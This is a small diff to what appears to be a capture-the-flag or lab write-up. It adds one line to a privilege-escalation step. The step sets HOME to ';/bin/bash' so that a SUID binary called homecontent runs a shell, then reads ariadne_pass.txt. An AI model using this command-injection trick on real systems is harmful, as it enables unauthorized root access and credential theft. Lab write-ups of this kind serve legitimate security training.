@@ -9,4 +9,5 @@ The homecontent SUID binary seems to be using the ls command to show us the cont
 ```
 export HOME=';/bin/bash'
 ./homecontent
+cat ariadne_pass.txt
 ```
